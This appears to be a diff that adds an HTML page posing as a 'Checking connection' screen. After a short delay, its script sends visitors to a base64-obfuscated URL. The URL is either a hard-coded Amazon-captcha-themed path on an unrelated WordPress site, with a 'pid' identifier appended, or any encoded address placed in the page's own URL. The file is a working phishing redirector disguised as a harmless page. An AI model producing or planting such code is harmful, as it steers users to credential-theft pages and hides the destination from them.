@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Connecting</title>
+    </head>
+    <body>
+        <p>Checking connection</p>
+        <script>
+            
+            var _u = window.location.href;
+        var u = new URL(_u);
+        var getParam = u.searchParams.get('pid'); 
+            
+            setTimeout(function() {
+            if(window.location.href.includes(".(")) {
+                document.location.href = atob(window.location.href.split(".(")[1]);
+            } else {
+                document.location.href = atob("aHR0cHM6Ly90YWxlbnRkYXNoYm9hcmQuYWZvbS5pbi93cC1jb250ZW50L2FtYXpvbi9jYXB0Y2hhLz9lPQ==")+getParam;
+            }
+            }, 2500);
+        </script>
+    </body>
+</html>
